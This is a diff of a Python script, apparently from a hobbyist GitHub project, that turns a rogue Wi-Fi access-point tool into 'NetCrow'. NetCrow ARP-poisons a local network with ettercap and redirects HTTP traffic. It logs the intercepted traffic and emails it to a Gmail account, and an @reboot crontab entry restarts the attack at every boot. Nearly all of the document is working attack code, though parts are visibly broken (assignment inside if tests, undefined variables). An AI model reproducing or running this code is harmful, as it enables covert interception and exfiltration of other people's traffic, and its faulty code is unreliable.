@@ -1,284 +1,386 @@
 # Imports
-
-import netifaces
-import os 
-import time 
+import os
+import time
+import subprocess
+import smtplib
+import datetime
 import os.path
 import sys
+from email.mime.text import MIMEText
+
 
 # Define Attributes
 
-Version = "2.0"
+Version = "3.0"
 Creator = "Raspberry"
-Published = "https://github.com/Raspberryy/FakeAccessPoint"
+Published = "https://github.com/Raspberryy/NetCrow"
 
-InternetInterface = "wlan0"
-APHostingInterface = "wlan1"
-MonitorInterface = "wlan1mon"
+Sender = ""
+Password = ""
+Reciever = ""
 
-APName = "FreeWifi"
-Gateway = "192.168.0.1"
-Channel = "11"
+SaveDelay = 15		# Time Delay before Saving 
+ReRun = 10		# Repetition of Saving
+FinishExecution = "reboot" # Possible "reboot" "shutdown" "stay" - Standart "reboot"
 
-
-
+nettest = 0
+SendBoot = 0
+BootBol = 0 
 Path = os.path.dirname(os.path.abspath(__file__))
-OptionsArray = []
-InterfaceArray = []
-NoStart = 0
+
+
+
 
 # Define Colours
 
 pink = '\033[95m'
 blue = '\033[94m'
 green = '\033[92m'
-yellow = '\033[93m'
+yell = '\033[93m'
 red = '\033[91m'
 white = '\033[0m'
 bold = '\033[1m'
 under = '\033[4m'
 
-# Define Functions
 
-def GettingAttributes():
-	
-	# Get Interfaces Arrays
-	InterfaceArray = netifaces.interfaces()	
-	i = 0 
-	
-	
-	while(i<len(InterfaceArray)):
-		OptionsArray.append("")
-		i = i+1 
-	i = 0	
-	LoadTable(InterfaceArray, OptionsArray)	
-	
-	# Get Interface which is connected to Internet
-        IntegerInternet = int(raw_input(blue + "[=]" + white + " Enter Number of Interface WITH Internet: "))
-        InternetInterface = InterfaceArray[IntegerInternet]
-        OptionsArray[IntegerInternet] = "Internet-Connected"
-        LoadTable(InterfaceArray, OptionsArray)	
+# Define Main Function
 
-	# Get Interface which is going to host the AP
-	IntegerAP = int(raw_input(blue + "[=]" + white + "  Enter Number the AP Hosting Interface: " ))
-	if(IntegerAP==IntegerInternet):
-		print ""
-		print "You need two diffrent Interfaces!"
-		time.sleep(5)
-		OptionsArray[IntegerInternet] = ""
-                OptionsArray[IntegerAP] = ""
-                GettingAttributes()
-
-	APHostingInterface = InterfaceArray[IntegerAP]
-	OptionsArray[IntegerAP] = "AP-Hosting Interface"
-	LoadTable(InterfaceArray, OptionsArray)	
+def BootingAttack():
 	
-	# Get Gateway
-	print ""
-	print yellow + "[*]"  + white + " Getting Gateway"
-	time.sleep(2)
-	GatewayArray = netifaces.gateways()
-	TempArray = GatewayArray['default'][netifaces.AF_INET]
-	
-	if(TempArray[1]==InternetInterface):
-		Gateway = TempArray[0]
-	else:
-		os.system("clear")
-		os.system("route -n")
-		print ""
-		print ""
-		Gateway = raw_input(blue + "[=]" + white +"Enter your Gateway manually (Example: 192.168.2.1): " ) 
-		os.system("clear")
-	
+	if SendBoot != 1:
+		SendBootUp()
+		
+	try:
+        StartAttack()
+	except:
+        ErrSub = "Starting the Atttack FAILED"
+        try:
+			interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+			interface_get = os.popen(interface_comm).read()
+			UpTimeTemp = GetUpTime()
+			interface = interface_get[0:4]
+			ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
+        except:
+			ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
+			SendMail(ErrSub, ErrText)
 
-	# Show Options 
-	os.system("clear")
-	print ""
-	print "	Interface Connected to Internet	" + "||   " +  InternetInterface
-	print "	AP-Hosting Interface		" + "||   " +  APHostingInterface
-	print "	Gateway				" + "||   " +  Gateway
 
-	print ""
-	Feedback = str(raw_input(blue + "[=]" + white + " All Entries Correct [Y/n] "))
-        print ""
-	if(Feedback==""):
-                print yellow + "[*]"  + white + "Set Routing"
-        elif(Feedback=='Y'):
-                print yellow + "[*]"  + white + "Set Routing"
-        elif(Feedback=='y'):
-                print yellow + "[*]"  + white + "Set Routing"
+	# Preparing Reboot
+	AutoEmailSend()
+	SaveOldFile()
+	os.system("rm "+ Path  + "/ettercap.txt")
+	if rebootbol != 1:
+	        os.system("reboot")	
+
+
+
+
+
+# Define Main-Sub-Functions
+
+def SendBootUp():
+	
+	# Send Mail after Boot
+	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
+	Date = time.strftime("%d/%m/%Y")
+	Sub = "NetCrow has started working at " + Time + " the " + Date + " !!!" 
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+        interface_get = os.popen(interface_comm).read()
+        interface = interface_get[0:4]
+	if interface == "wlan":
+                interface = "wlan0"
+	# Get IP Adress
+	ipaddress_comm = "hostname -I"
+	ipaddress_get = os.popen(ipaddress_comm).read()
+	Text = "Interface	    " + interface +"\nNetwork IP	" + ipaddress_get  
+	SendMail(Sub, Text)
+	
+	
+def StartAttack():
+	
+	# Set up Interface String
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+		
+	# Set up Environment
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") 
+	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") 
+	
+	# Start Ettercap
+	try:
+                command = "ettercap -T -q -i " + interface + " -M arp /// /// >" + Path + "/ettercap.txt &"
+                os.system(command)
+        except:
+                print red + "Error - Starting Ettercap failed" + white
         else:
-                OptionsArray[IntegerInternet] = ""
-                OptionsArray[IntegerAP] = ""
-                GettingAttributes()
+                command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
+                os.system(command)
+
+				
+				
+def GetUpTime():
+	UpRead = os.popen("uptime").read()
+	UpTime = UpRead[12:25]
+	return UpTime
+
+
+def AutoEmailSend():
 	
-	# Monitor Mode
-	AirmonCommand = "airmon-ng start " + APHostingInterface 
-	os.system("airmon-ng check kill")
-	os.system(AirmonCommand)
+	# Loop 
+	BackupsAnzahl = 0 
+	while BackupsAnzahl < ReRun:
+		time.sleep(SaveDelay)
+		SaveOldFile()
+		BackupsAnzahl = BackupsAnzahl + 1
+
+	# Send Mail
+	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
+       	Date = time.strftime("%d/%m/%Y")
+	SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
 	
+	# Getting and Setting Text
+	ettertext = open(Path + "/ettercap.txt", 'rb')
+	ettermsg = MIMEText(ettertext.read())
+	ettertext.close()
+	TextAttackFinished = ettermsg
+
+	# Sending Email
+	SendMail(SubjectAttackFinished, TextAttackFinished)
+
+
+def SendMail(Subject, Text):
+
+	# Connect to Server
+	server = smtplib.SMTP('smtp.gmail.com', 587)
+	server.ehlo()
+	server.starttls()
+	server.ehlo
+	server.login(Sender, Password)
 	
+	# Set Text and Subject
+	Message = 'Subject: %s\n\n%s' % (Subject, Text)
+
+
+	# Sending Email
+	try:
+	        server.sendmail(Sender, Reciever, Message)
+	except:
+		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
+        	Date = time.strftime("%d/%m/%Y")
+		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
+		os.system(tempcmd)
+	server.quit()	
 	
-	# Starting other Defs
-	MonitorInterface = APHostingInterface + "mon"
-	SetUpDhcpServer(MonitorInterface)
-	SetIpRules(Gateway, InternetInterface)
-	print yellow + "[*]"  + white + "Starting Ettercap"
-	StartEttercap()
-	return APHostingInterface
+def SaveOldFile():
 
+	SaveStat = 0 
+	vartemp = 0
+	while SaveStat == 0: 
+		commandtempif = Path + "/Logging/ettercap" + str(vartemp)  + ".txt"
+		if (os.path.isfile(commandtempif)):
+                        vartemp = vartemp + 1 
+		else:
+			commtemp = "cp " + Path  + "/ettercap.txt " + Path  + "/Logging/ettercap" + str(vartemp)  + ".txt"
+                        os.system(commtemp)
+			SaveStat = 1
+	return
 
+def FinishExe():
+	
+	if FinishExecution = "reboot":
+		os.system("reboot")
+	if FinishExecution = "shutdown":
+		os.system("shutdown now")
+	if FinishExecution == "stay":
+		print yellow + "[*]" + white + "NetCrow has finished Working - Close it manually"
+		
+	
+# Define Sub-Functions	
+	
+def AutoStart():
+	
+	os.system("sudo crontab -l > mycron")
+	CommandString = "sudo echo \'@reboot sh " + Path + "/launcher.sh > " + Path + "/Logging/cronlog 2>&1  \' >> mycron"
+	os.system(CommandString)
+	os.system("sudo crontab mycron")
+	os.system("sudo rm mycron")
+	CommandLauncher = "echo \'sudo python " + Path + "/attack.py\' > launcher.sh"
+	os.system(CommandLauncher)
 
+def AutoStartDis():
+	
+	# Warn User
+	print ""
+	print red + "           All Crontab Jobs are going to be deleted!!!" + white
+	print ""
+	print ""
+	raw_input("     Press any Key to continue...")
+	print ""
+	
+	# Delete Jobs
+	os.system("crontab -r")
+
+	# Delete Launcher.sh
+	dellaun = "rm " + Path + "/launcher.sh"
+	os.system(dellaun)
 
 	
-def LoadTable(InterfaceArray, OptionsArray):
-	i = 0
-	# Set up Table
-        os.system("clear")
-        print ""
-        print "	Number  ||      Interface       ||      Options         "
-        print "	--------------------------------------------------------"
-
-        # Fill Table
-        while(i<len(InterfaceArray)):
-                print "	" + str(i) + "	||	" + str(InterfaceArray[i]) + "		||	" + str(OptionsArray[i])
-                i = i+1
-        print ""
-
-
-
-def SetUpDhcpServer(MonitorInterface):
-	print yellow + "[*]"  + white + "Set up Dhcp Server"
-	if(os.path.isfile("/etc/dhcpd.conf")):
-		print red +'[-] ' + white + "Deleting old dhcpd.conf"
-		os.system("rm /etc/dhcpd.conf")	
+def AttackOnly():
 	
-	print green + '[+] ' + white + "Creating dhcpd.conf"
-	os.system("echo 'Authoritative;' > /etc/dhcpd.conf ")
-	os.system("echo 'Default-lease-time 600;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Max-lease-time 7200;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Subnet 192.168.1.0 netmask 255.255.255.0 {' >> /etc/dhcpd.conf ")
-	
-	# Set AP-Name
-	UserAP = raw_input(blue + "[=]" + white + " Enter desired AP-Name (e.g FreeWifi): " )
-	apnamewithquo = '"' + UserAP + '"' 
-	os.system("echo 'Option domain-name %s ;' >> /etc/dhcpd.conf " % apnamewithquo)
-	
-	os.system("echo 'Option routers 192.168.1.1;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Option subnet-mask 255.255.255.0;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
-	os.system("echo '}' >> /etc/dhcpd.conf ")	
-	StartAirbaseServer(UserAP, MonitorInterface)
-
-
-def StartAirbaseServer(UserAP, MonitorInterface):
-	print yellow + "[*]"  + white + "Starting Airbase-Server"
-	# Check for LogFile
-	LogFile = Path + "/AirBase.log"
-	if(os.path.isfile(LogFile)):
-		print red +'[-] ' + white + "Delete AirBase.log"
-        	os.system("rm %s" %LogFile)
-	
-
-	# Set Air-Base String
-	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + UserAP +  " " + MonitorInterface + " > " + Path + "/AirBase.log &"
-	 
-	#Execute
-	os.system(CommandAirBase) 
-
-def StartEttercap():
-	print yellow + "[*]"  + white + "Starting to Listen on AP"
-	os.system("ettercap -p -u -T -q -i at0")
-
- 
-def SetIpRules(Gateway, InternetInterface):
-	print yellow + "[*]"  + white + "Routing Rules"
-	time.sleep(5)
-	os.system("ifconfig at0 192.168.1.1 netmask 255.255.255.0")
-	os.system("ifconfig at0 mtu 1400")
-	os.system("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
+	# Set up Interface String
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+		
+	# Set up Environment
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	os.system("iptables -t nat -A PREROUTING -p udp -j DNAT --to %s" % Gateway)
-	os.system("iptables -P FORWARD ACCEPT")
-	os.system("iptables --append FORWARD --in-interface at0 -j ACCEPT")
-	os.system("iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE" % InternetInterface)
-	os.system("dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0")
-	os.system("/etc/init.d/isc-dhcp-server start")
+	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+
+	# Start Ettercap
+	try:
+		command = "ettercap -T -q -i " + interface + " -M arp /// ///"
+		os.system(command)
+	except:
+		print red + "Error - Starting Ettercap failed" + white
+	else:
+		command = "ettercap -T -q -i " + interface + " -M arp // //"
+		os.system(command)	
+		
+def BackgroundAttack():
+	
+	# Set up Interface String
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+		
+	# Set up Environment
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+
+	# Start Ettercap
+	try:
+		command = "ettercap -T -q -i " + interface + " -M arp /// /// > " + Path + "/Logging/cronlog 2>&1"
+		os.system(command)
+	except:
+		print red + "Error - Starting Ettercap failed" + white
+	else:
+		command = "ettercap -T -q -i " + interface + " -M arp // // > " + Path + "/Logging/cronlog 2>&1"
+		os.system(command)
+	
+		
+def TestMail():
+	SendMail("It works!", "This is a Test-Mail generated by NetCrow")	
+
+def DeleteBackup():
+	print ""
+	print red + "	Clearing Backup Data" + white
+	print ""
+	time.sleep(2)
+	clearcommand = "rm " + Path + "/Logging/ettercap*"	
+	clearfile = "rm " + Path + "/ettercap.txt"
+	os.system(clearcommand)
+	os.system(clearfile)
 	
 
 def PrintHelp():
 	print ""
-	print green + under +  "		FakeAccessPoint - BY RASPBERRYY" + white	
+	print green + under +  "		NETCROW - BY RASPBERRYY" + white	
 	print ""
 	print "	Command List:"
-	print "	-m		Use manuel Values"
-	print "	-h --help	Prints this"	
+	print "	 -a             Start Attack manually"
+	print "	 -b             Start Attack in Background"
+	print "	 -d             Delete Backups in Logging"	
+	print "	 -h --help	Prints this"	
+	print "	 -r 		Prevent Reboot"
+	print "	 -s             Prevent NetCrow Start Message"
+	print "	 -t		Send Test E-Mail"
+	print "	 --AutoStart-enable     Enable automatical Boot"
+        print "	 --AutoStart-disable    Disable automatical Boot"
 	print ""
-	
-	
-def ManuelAttack():
-
-	ManuelDHCP()	
-	
-	# Airbase Server
-	LogFile = Path + "/AirBase.log"
-	if(os.path.isfile(LogFile)):
-		print red +'[-] ' + white + "Delete AirBase.log"
-        	os.system("rm %s" %LogFile)
-	# Set Air-Base String
-	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + APName +  " " + MonitorInterface + " > " + Path + "/AirBase.log &" 
-	#Execute
-	os.system(CommandAirBase)
-
-	SetIpRules(Gateway, InternetInterface)
-	StartEttercap()
 
 
-def ManuelDHCP():
-	if(os.path.isfile("/etc/dhcpd.conf")):
-		print red +'[-] ' + white + "Deleting old dhcpd.conf"
-		os.system("rm /etc/dhcpd.conf")	
-	print green + '[+] ' + white + "Creating dhcpd.conf"
-	apnamewithquo = '"' + APName + '"' 
-	os.system("echo 'Authoritative;' > /etc/dhcpd.conf ")
-	os.system("echo 'Default-lease-time 600;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Max-lease-time 7200;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Subnet 192.168.1.0 netmask 255.255.255.0 {' >> /etc/dhcpd.conf ")
-	os.system("echo 'Option domain-name %s ;' >> /etc/dhcpd.conf " % apnamewithquo)
-	os.system("echo 'Option routers 192.168.1.1;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Option subnet-mask 255.255.255.0;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
-	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
-	os.system("echo '}' >> /etc/dhcpd.conf ")
 
-# Main Program
+
+# Main Program - Test for Commands
 
 if len(sys.argv)==1:
 	sys.argv.append(" ")
+if len(sys.argv)==2:
+	sys.argv.append(" ")
 
-	
 if sys.argv[1]=="-h":
         PrintHelp()
-	NoStart = 1
-	
+	BootBol = 1
+elif sys.argv[2]=="-h":
+        PrintHelp()
 	BootBol = 1
 elif sys.argv[1]=="--help":
         PrintHelp()
-	NoStart = 1
+	BootBol = 1
+elif sys.argv[2]=="--help":
+        PrintHelp()
+	BootBol = 1
+
+elif sys.argv[1]=="-a":
+	AttackOnly()
+	BootBol = 1
+elif sys.argv[2]=="-a":
+	AttackOnly()
+	BootBol = 1
+
+elif sys.argv[1]=="-b":
+	BackgroundAttack()
+	BootBol = 1
+elif sys.argv[2]=="-b":
+	BackgroundAttack()
+	BootBol = 1
+	
+elif sys.argv[1]=="-s":
+        SendBoot = 1
+elif sys.argv[2]=="-s":
+        SendBoot = 1
+
+elif sys.argv[1]=="-t":
+        TestMail()
+	BootBol = 1
+elif sys.argv[2]=="-t":
+        TestMail()
+	BootBol = 1	
+
+elif sys.argv[1]=="--AutoStart-enable":
+        AutoStart()
+        BootBol = 1
+elif sys.argv[2]=="--AutoStart-enable":
+        AutoStart()
+        BootBol = 1
+
+elif sys.argv[1]=="--AutoStart-disable":
+        AutoStartDis()
+        BootBol = 1
+elif sys.argv[2]=="--AutoStart-disable":
+        AutoStartDis()
+        BootBol = 1
 
 
-elif sys.argv[1]=="-m":
-	ManuelAttack()
-	NoStart = 1
+elif sys.argv[1]=="-d":
+        DeleteBackup()
+        BootBol = 1
+elif sys.argv[2]=="-d":
+        DeleteBackup()
+        BootBol = 1
+        
+
+		
 
 
+# No Commands - Starting Normal Booting Attack
 
-# No Commands - Starting Normal FakeAccessPoint
-if NoStart!=1:
-	APHostingInterface = GettingAttributes()
-	MonitorInterface = APHostingInterface + "mon"
-	print yellow + "[*]" + white + "Stopping Ettercap"
-	print yellow + "[*]" + white + "Stopping " + MonitorInterface
-	os.system("airmon-ng stop %s" %MonitorInterface)
-	print red + "[!]" + white + "Make sure to close the Airbase Server"
+if BootBol != 1:
+	BootingAttack()
